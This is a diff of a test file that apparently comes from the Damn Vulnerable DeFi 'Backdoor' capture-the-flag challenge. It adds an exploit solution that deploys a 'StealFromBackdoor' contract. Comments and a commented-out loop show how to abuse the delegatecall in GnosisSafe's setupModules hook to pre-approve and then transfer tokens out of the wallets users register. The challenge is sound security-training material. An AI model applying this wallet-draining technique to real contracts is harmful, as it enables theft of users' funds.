@@ -16,7 +16,7 @@ describe('[Challenge] Backdoor', function () {
         masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
         walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        
+
         // Deploy the registry
         walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
             masterCopy.address,
@@ -46,6 +46,47 @@ describe('[Challenge] Backdoor', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("Execution/start");
+
+        // exploit the hook in GnosisSafe.sol -> function setup -> setupModules
+        // since it used delegatecall, we can approve on behalf of the wallet in advance
+        // and retrieve the token afterwards
+        steal = await (await ethers.getContractFactory('StealFromBackdoor', player)).deploy(
+            token.address,
+            users,
+            masterCopy.address,
+            walletFactory.address,
+            walletRegistry.address
+        );
+
+        //
+        // Below code should also work, but require multiple transaction from player
+        //
+
+        // let ABI = [
+        //     "function setup(address _token, address _to)"
+        // ];
+        // let iface = new ethers.utils.Interface(ABI);
+        // data = iface.encodeFunctionData("setup", [token.address, player.address]);
+
+        // for (let i = 0; i < users.length; i++) {
+        //     console.log("Execution/loop: ", i, users[i]);
+        //     userAddress = users[i];
+
+        //     const initCode = masterCopy.interface.encodeFunctionData("setup", [
+        //         [userAddress],
+        //         1,
+        //         steal.address,
+        //         data,
+        //         ethers.constants.AddressZero,
+        //         ethers.constants.AddressZero,
+        //         0,
+        //         ethers.constants.AddressZero
+        //     ]);
+        //     await walletFactory.createProxyWithCallback(masterCopy.address, initCode, 1, walletRegistry.address);
+        //     await token.connect(player).transferFrom(walletRegistry.wallets(userAddress), player.address, 10n * 10n ** 18n);
+        // }
+        console.log("Execution/end");
     });
 
     after(async function () {
@@ -56,7 +97,7 @@ describe('[Challenge] Backdoor', function () {
 
         for (let i = 0; i < users.length; i++) {
             let wallet = await walletRegistry.wallets(users[i]);
-            
+
             // User must have registered a wallet
             expect(wallet).to.not.eq(
                 ethers.constants.AddressZero,
